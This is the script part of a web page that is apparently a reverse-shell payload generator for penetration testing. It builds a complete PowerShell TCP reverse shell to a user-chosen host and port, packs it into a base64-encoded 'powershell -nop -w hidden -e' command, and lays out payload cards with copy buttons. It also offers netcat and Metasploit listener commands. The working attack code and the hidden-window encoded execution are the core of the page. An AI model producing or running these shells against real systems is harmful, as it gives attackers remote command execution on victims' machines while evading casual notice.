  /* ── PowerShell base64 (real UTF-16LE encoding) ──────────────── */
  function psReverseSource(l, p) {
    return "$client = New-Object System.Net.Sockets.TCPClient('" + l + "'," + p + ");" +
      "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};" +
      "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;" +
      "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
      "$sendback = (iex $data 2>&1 | Out-String );" +
      "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
      "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" +
      "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
  }
  function utf16leBase64(str) {
    let bin = '';
    for (let i = 0; i < str.length; i++) {
      const c = str.charCodeAt(i);
      bin += String.fromCharCode(c & 0xff, (c >> 8) & 0xff);
    }
    return btoa(bin);
  }
  function psEncoded(l, p) { return 'powershell -nop -w hidden -e ' + utf16leBase64(psReverseSource(l, p)); }

  /* ── Rendering ───────────────────────────────────────────────── */
  function highlight(str) {
    // escape, then wrap literal LHOST / LPORT occurrences in holo spans
    const l = (cfg.LHOST || '').trim(), p = (cfg.LPORT || '').trim();
    let html = esc(str);
    [l, p].forEach(v => {
      if (!v) return;
      const re = new RegExp('(' + v.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'g');
      html = html.replace(re, '<span class="subbed">$1</span>');
    });
    // also mark unresolved <LHOST>/<LPORT> tokens (when a field is blank)
    html = html.replace(/&lt;(LHOST|LPORT)&gt;/g, '<span class="subbed">&lt;$1&gt;</span>');
    return html;
  }

  function orderedFor(cat) {
    let rows = P_LIST.filter(x => x.cat === cat);
    if (cat === 'REVERSE SHELLS') {
      const pref = cfg.SHELL;
      rows = rows.slice().sort((a, b) => (b.shell === pref) - (a.shell === pref));
    }
    return rows;
  }

  function renderCats() {
    const el = $('cats');
    el.innerHTML = CATS.map(c => {
      const n = P_LIST.filter(x => x.cat === c).length;
      const active = c === curCat ? ' navitem--active' : '';
      return `<button class="navitem${active}" data-cat="${esc(c)}">${esc(c)}<span class="count">${n}</span></button>`;
    }).join('');
    el.querySelectorAll('.navitem').forEach(b =>
      b.addEventListener('click', () => { curCat = b.dataset.cat; renderCats(); renderCards(); }));
  }

  function renderCards() {
    const l = L(), p = P(), rows = orderedFor(curCat);
    $('h-title').textContent = curCat;
    $('h-sub').textContent = rows.length + ' payloads';
    $('cards').innerHTML = rows.map((x) => {
      const idx = P_LIST.indexOf(x);
      const cmd = x.gen(l, p);
      const pref = (curCat === 'REVERSE SHELLS' && x.shell === cfg.SHELL)
        ? '<span class="tag tag--amber">PREFERRED</span>' : '';
      const enc = x.computed ? '<span class="tag tag--holo">LIVE-ENCODED</span>' : '';
      const tags = x.tags.map(t => `<span class="tag">${esc(t)}</span>`).join('');
      return `<div class="card brackets">
        <div class="cmd-top">
          <span class="cmd-name">${esc(x.name)}</span>
          <button class="copy-btn" data-i="${idx}">⧉ COPY</button>
        </div>
        <div class="code">${highlight(cmd)}</div>
        <div class="cmd-desc">${esc(x.desc)}</div>
        <div class="cmd-tags">${pref}${enc}${tags}</div>
      </div>`;
    }).join('');
  }

  function ncListener() { return 'nc -lvnp ' + P(); }
  function msfListener() {
    return 'msfconsole -q -x "use multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST ' +
      L() + '; set LPORT ' + P() + '; exploit -j"';
  }
  function renderListenerHint() {
    $('lh-port').textContent = P();
    $('lh-nc').innerHTML = highlight(ncListener());
    $('lh-msf').innerHTML = highlight(msfListener());
  }

  function updateStats() {
    $('s-count').textContent = P_LIST.length;
    $('s-lhost').textContent = (cfg.LHOST || '').trim() || '—';
    $('s-lport').textContent = (cfg.LPORT || '').trim() || '—';
    $('s-shell').textContent = (cfg.SHELL || 'bash').toUpperCase();
  }

  /* ── Copy handling ───────────────────────────────────────────── */
  function copyText(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) return navigator.clipboard.writeText(text);
    return new Promise(res => {
      const ta = document.createElement('textarea');
      ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
      document.body.appendChild(ta); ta.select();
      try { document.execCommand('copy'); } catch (e) {}
      document.body.removeChild(ta); res();
    });
  }
  function flashBtn(btn, codeEl) {
    if (codeEl) { codeEl.classList.remove('flash'); void codeEl.offsetWidth; codeEl.classList.add('flash'); }
    const prev = btn.textContent; btn.textContent = '✔'; btn.classList.add('copy-fb');
    setTimeout(() => { btn.textContent = prev; btn.classList.remove('copy-fb'); }, 900);
  }
  $('cards').addEventListener('click', e => {
    const btn = e.target.closest('.copy-btn'); if (!btn) return;
    const x = P_LIST[+btn.dataset.i]; if (!x) return;
    copyText(x.gen(L(), P())).then(() => {
      const card = btn.closest('.card');
      flashBtn(btn, card && card.querySelector('.code'));
      btn.textContent = '✔ COPIED';
      setTimeout(() => { btn.textContent = '⧉ COPY'; }, 900);
    });
  });
  document.querySelector('.listener-hint').addEventListener('click', e => {
    const btn = e.target.closest('.lh-copy'); if (!btn) return;
    const text = btn.dataset.lh === 'nc' ? ncListener() : msfListener();
    copyText(text).then(() => flashBtn(btn, btn.parentElement.querySelector('code')));
  });

  /* ── Inputs ──────────────────────────────────────────────────── */
  $('p-LHOST').value = cfg.LHOST; $('p-LPORT').value = cfg.LPORT; $('p-SHELL').value = cfg.SHELL;
  function refreshAll() { updateStats(); renderListenerHint(); renderCards(); }
  $('p-LHOST').addEventListener('input', () => { cfg.LHOST = $('p-LHOST').value; save(); refreshAll(); });
  $('p-LPORT').addEventListener('input', () => { cfg.LPORT = $('p-LPORT').value; save(); refreshAll(); });
  $('p-SHELL').addEventListener('change', () => { cfg.SHELL = $('p-SHELL').value; save(); updateStats(); renderCats(); renderCards(); });

  /* ── Boot ────────────────────────────────────────────────────── */
  updateStats(); renderCats(); renderListenerHint(); renderCards();
  </script>
</body>
</html>
